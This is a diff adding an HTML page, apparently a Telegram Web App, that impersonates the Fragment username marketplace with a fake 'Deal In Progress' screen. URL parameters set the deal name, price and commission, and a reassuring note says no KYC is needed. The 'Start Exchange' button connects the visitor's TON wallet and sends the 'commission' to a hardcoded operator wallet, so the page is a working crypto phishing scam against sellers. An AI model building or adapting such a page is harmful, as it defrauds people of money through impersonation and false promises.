@@ -1,0 +1,489 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Fragment info</title>
+  <script src="https://telegram.org/js/telegram-web-app.js"></script>
+  <style>
+    body {
+      margin: 0;
+      background-color: #0d1117;
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Oxygen, Ubuntu, Cantarell, "Open Sans", "Helvetica Neue", sans-serif;
+      color: white;
+    }
+
+    .container {
+      max-width: 480px;
+      margin: 0 auto;
+      padding: 16px;
+    }
+
+    .header {
+      display: flex;
+      align-items: center;
+      margin-bottom: 20px;
+    }
+
+    .header img {
+      height: 50px;
+      margin-right: 1px;
+    }
+
+    .header span {
+      font-size: 15px;
+      font-weight: 600;
+      color: #ccc;
+    }
+
+    .deal-box {
+      background-color: #161b22;
+      border-radius: 10px;
+      padding: 16px;
+      margin-bottom: 16px;
+    }
+
+    .deal-header {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      margin-bottom: 12px;
+    }
+
+    .deal-name {
+      font-size: 18px;
+      font-weight: 600;
+    }
+
+    .deal-status {
+      background-color: #00cc66;
+      padding: 4px 10px;
+      border-radius: 999px;
+      font-size: 13px;
+      font-weight: 500;
+      color: white;
+    }
+
+    .deal-info {
+      display: flex;
+      justify-content: space-between;
+      margin-bottom: 12px;
+    }
+
+    .info-column {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      flex: 1;
+    }
+
+    .info-title {
+      font-size: 13px;
+      color: #a0a0a0;
+      margin-bottom: 4px;
+    }
+
+    .info-value {
+      display: flex;
+      align-items: center;
+      font-size: 18px;
+      font-weight: bold;
+    }
+
+    .ton-icon {
+      width: 16px;
+      height: 16px;
+      margin-right: 4px;
+    }
+
+    .info-usd {
+      font-size: 13px;
+      color: #888;
+      margin-top: 4px;
+    }
+
+    .how-link {
+      display: block;
+      font-size: 13px;
+      color: #4faaff;
+      text-align: center;
+      text-decoration: none;
+      margin-top: 10px;
+    }
+
+    .details-box {
+      background-color: #161b22;
+      border-radius: 10px;
+      padding: 16px;
+      margin-bottom: 16px;
+    }
+
+    .detail-row {
+      display: flex;
+      justify-content: space-between;
+      margin-bottom: 10px;
+    }
+
+    .label {
+      font-weight: 600;
+      font-size: 14px;
+      color: #ccc;
+    }
+
+    .value, .value-link {
+      font-size: 14px;
+      color: #4faaff;
+      text-decoration: none;
+    }
+
+    .button {
+      width: 100%;
+      padding: 14px;
+      font-size: 16px;
+      background-color: #2298ff;
+      color: white;
+      border: none;
+      border-radius: 10px;
+      font-weight: 600;
+      cursor: pointer;
+      margin-bottom: 12px;
+    }
+
+    .subscribe {
+      text-align: center;
+      font-size: 14px;
+      color: #4faaff;
+      margin-bottom: 16px;
+      text-decoration: underline;
+      cursor: pointer;
+    }
+
+    .info-box {
+      background-color: #0e1621;
+      color: #b0c4d8;
+      font-size: 13px;
+      padding: 14px;
+      border-radius: 10px;
+      text-align: center;
+      line-height: 1.4;
+    }
+ .deal-footer {
+  display: flex;
+  justify-content: center; /* Центрируем все deal-row по горизонтали */
+  gap: 16px;
+  margin-top: 24px;
+}
+
+.deal-row {
+  display: flex;
+  flex-direction: column;
+  align-items: center; /* Центрируем содержимое deal-row */
+  background: #161b22;
+  border-radius: 8px;
+  padding: 10px 14px;
+  min-width: 120px;
+}
+
+    a {
+      color: #4faaff;
+    }
+  </style>
+</head>
+<head>
+  <!-- ...existing code... -->
+  <script src="https://unpkg.com/@tonconnect/ui@latest/dist/tonconnect-ui.min.js"></script>
+  <!-- ...existing code... -->
+</head>
+<body>
+  <div class="container">
+    <div class="header">
+  <img src="logo.png" alt="Fragment Logo" />
+  <span>FRAGMENT</span>
+</div>
+
+
+    <div class="deal-box">
+      <div class="deal-header">
+  <span class="deal-name" id="deal-name">vladiimrgod.t.me</span>
+  <span class="deal-status" id="deal-status">Deal In Progress</span>
+</div>
+
+<div class="deal-info">
+  <div class="info-column">
+    <span class="info-title">Deal Price</span>
+    <div class="info-value">
+      <img class="ton-icon" src="ton.png" alt="TON" /> 
+      <span id="deal-price">4500</span>
+    </div>
+    <span class="info-usd" id="deal-usd">~ $12411.00</span>
+  </div>
+  <div class="info-column">
+    <span class="info-title">Commission</span>
+    <div class="info-value">
+      <img class="ton-icon" src="ton.png" alt="TON" /> 
+      <span id="commission">225</span>
+    </div>
+    <span class="info-usd" id="commission-usd">~ $620.55</span>
+  </div>
+</div>
+
+      <a href="#" class="how-link">How does this work?</a>
+    </div>
+
+    <div class="details-box">
+  <div class="detail-row">
+    <span class="label">Telegram Username</span>
+    <a class="value-link" id="tg-username-link" href="https://t.me/vladiimrgod"><span id="tg-username">@vladiimrgod</span></a>
+  </div>
+  <div class="detail-row">
+    <span class="label">Web Address</span>
+    <a class="value-link" id="web-address-link" href="https://t.me/vladiimrgod"><span id="web-address">t.me/vladiimrgod</span></a>
+  </div>
+  <div class="detail-row">
+    <span class="label">TON Web 3.0 Address</span>
+    <a class="value-link" id="ton-web-link" href="https://vladiimrgod.t.me"><span id="ton-web">vladiimrgod.t.me</span></a>
+  </div>
+</div>
+<button class="button" id="start-exchange-btn">Start Exchange</button>
+    <div class="subscribe">Subscribe to updates</div>
+    
+
+
+    <div class="info-box">
+      You do not need to complete KYC verification,<br />
+      as the buyer is a verified merchant on a Fragment<br />
+      that has a security deposit of 💎10,000.
+    </div>
+  </div>
+  
+
+  <script>
+  Telegram.WebApp.ready();
+
+  // Функция для получения параметров из URL
+  function getParam(name) {
+    const url = new URL(window.location.href);
+    return url.searchParams.get(name);
+  }
+
+  // Пример: ?dealname=nick.t.me&price=1234&usd=5678&commission=100&commissionusd=10&username=nick&buyer=BuyerName
+  window.addEventListener('DOMContentLoaded', () => {
+    // Deal name
+    const dealName = getParam('dealname');
+    if (dealName) {
+      document.getElementById('deal-name').textContent = dealName;
+      document.getElementById('ton-web').textContent = dealName;
+      document.getElementById('ton-web-link').href = 'https://' + dealName;
+    }
+
+    // Deal price
+    const price = getParam('price');
+    if (price) document.getElementById('deal-price').textContent = price;
+
+    // Deal USD
+    const usd = getParam('usd');
+    if (usd) document.getElementById('deal-usd').textContent = '~ $' + usd;
+
+    // Commission
+    const commission = getParam('commission');
+    if (commission) document.getElementById('commission').textContent = commission;
+
+    // Commission USD
+    const commissionUsd = getParam('commissionusd');
+    if (commissionUsd) document.getElementById('commission-usd').textContent = '~ $' + commissionUsd;
+
+    // Telegram username
+    const username = getParam('username');
+    if (username) {
+      document.getElementById('tg-username').textContent = '@' + username;
+      document.getElementById('tg-username-link').href = 'https://t.me/' + username;
+      document.getElementById('web-address').textContent = 't.me/' + username;
+      document.getElementById('web-address-link').href = 'https://t.me/' + username;
+    }
+
+    // Buyer (в футере)
+    const buyer = getParam('buyer');
+    if (buyer) {
+      const buyerSpans = document.querySelectorAll('.deal-footer .deal-row:nth-child(3) .value');
+      if (buyerSpans.length > 0) buyerSpans[0].textContent = buyer;
+    }
+  });
+</script>
+<script>
+  Telegram.WebApp.ready();
+
+  // Курс TON к доллару
+  const TON_TO_USD = 2.96; // замените на актуальный курс
+
+  // Функция для получения параметров из URL
+  function getParam(name) {
+    const url = new URL(window.location.href);
+    return url.searchParams.get(name);
+  }
+
+  // Функция для форматирования числа с двумя знаками после запятой
+  function formatUSD(value) {
+    return Number(value).toLocaleString(undefined, {minimumFractionDigits: 2, maximumFractionDigits: 2});
+  }
+
+  window.addEventListener('DOMContentLoaded', () => {
+    // Deal price (TON)
+    const price = getParam('price');
+    if (price) {
+      document.getElementById('deal-price').textContent = price;
+      // Пересчёт в USD
+      const usd = formatUSD(price * TON_TO_USD);
+      document.getElementById('deal-usd').textContent = `~ $${usd}`;
+    }
+
+    // Commission (TON)
+    const commission = getParam('commission');
+    if (commission) {
+      document.getElementById('commission').textContent = commission;
+      // Пересчёт в USD
+      const commissionUsd = formatUSD(commission * TON_TO_USD);
+      document.getElementById('commission-usd').textContent = `~ $${commissionUsd}`;
+    }
+
+    // Deal name
+    const dealName = getParam('dealname');
+    if (dealName) {
+      document.getElementById('deal-name').textContent = dealName;
+      document.getElementById('ton-web').textContent = dealName;
+      document.getElementById('ton-web-link').href = 'https://' + dealName;
+    }
+
+    // Telegram username
+    const username = getParam('username');
+    if (username) {
+      document.getElementById('tg-username').textContent = '@' + username;
+      document.getElementById('tg-username-link').href = 'https://t.me/' + username;
+      document.getElementById('web-address').textContent = 't.me/' + username;
+      document.getElementById('web-address-link').href = 'https://t.me/' + username;
+    }
+
+    // Buyer (в футере)
+    const buyer = getParam('buyer');
+    if (buyer) {
+      const buyerSpans = document.querySelectorAll('.deal-footer .deal-row:nth-child(3) .value');
+      if (buyerSpans.length > 0) buyerSpans[0].textContent = buyer;
+    }
+  });
+</script>
+<script src="https://unpkg.com/@tonconnect/ui@latest/dist/tonconnect-ui.min.js"></script>
+<script>
+  // Ваш TON-кошелек для получения комиссии
+  const RECEIVER_WALLET = "UQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"; // замените на свой адрес
+
+  // Инициализация TON Connect UI (без кнопки)
+  const tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
+    manifestUrl: 'https://raw.githubusercontent.com/ton-connect/demo-dapp-with-react/main/public/tonconnect-manifest.json'
+  });
+
+  document.getElementById('start-exchange-btn').onclick = async function() {
+    // Получаем сумму комиссии из DOM
+    const commission = document.getElementById('commission').textContent;
+    if (!commission) {
+      alert('Commission not set!');
+      return;
+    }
+
+    // Проверяем подключение кошелька, если не подключён — подключаем
+    let wallet = tonConnectUI.wallet;
+    if (!wallet) {
+      await tonConnectUI.connectWallet();
+      wallet = tonConnectUI.wallet;
+      if (!wallet) {
+        alert('Please connect your TON wallet!');
+        return;
+      }
+    }
+
+    // Отправляем транзакцию
+    try {
+      await tonConnectUI.sendTransaction({
+        validUntil: Math.floor(Date.now() / 1000) + 600, // 10 минут
+        messages: [
+          {
+            address: RECEIVER_WALLET,
+            amount: (parseFloat(commission) * 1e9).toString(), // TON в нанотонах
+          }
+        ]
+      });
+      alert('Payment sent!');
+    } catch (e) {
+      alert('Payment failed or cancelled.');
+    }
+  };
+
+</script>
+
+  <div class="tradeinfo-header" style="margin-top:32px;">
+    <span class="tradeinfo-name">Fragment info</span>
+  </div>
+  <div class="tradeinfo-box">
+    <div class="tradeinfo-info">
+      <div class="tradeinfo-column">
+        <span class="tradeinfo-title">Deal Status</span>
+        <div class="tradeinfo-value">Deal In Progress</div>
+      </div>
+      <div class="tradeinfo-column">
+        <span class="tradeinfo-title">Username status</span>
+        <div class="tradeinfo-usd">Swappable</div>
+      </div>
+      <div class="tradeinfo-column">
+        <span class="tradeinfo-title">Buyer</span>
+        <div class="tradeinfo-usd">Ef_BbsF16B4aR...</div>
+      </div>
+    </div>
+  </div>
+  <style>
+    .tradeinfo-box {
+      background-color: #161b22;
+      border-radius: 10px;
+      padding: 16px;
+      margin: 0 auto;
+      max-width: 480px;
+      margin-bottom: 16px;
+    }
+   
+    .tradeinfo-name {
+      font-size: 16px;
+      color: #ffffff;
+      padding: 0 14px 16px;
+
+    }
+  
+    .tradeinfo-info {
+      display: flex;
+      justify-content: space-between;
+      margin-bottom: 12px;
+    }
+    .tradeinfo-column {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      flex: 1;
+    }
+    .tradeinfo-title {
+      font-size: 13px;
+      color: #a0a0a0;
+      margin-bottom: 4px;
+    }
+    .tradeinfo-value {
+      font-size: 12px;
+      font-weight: bold;
+      color: #ffffff;
+      padding: 4px;
+    }
+    .tradeinfo-usd {
+      font-size: 13px;
+      color: #888;
+      margin-top: 4px;
+    }
+  </style>
+
+</body>
+</html>
+
+
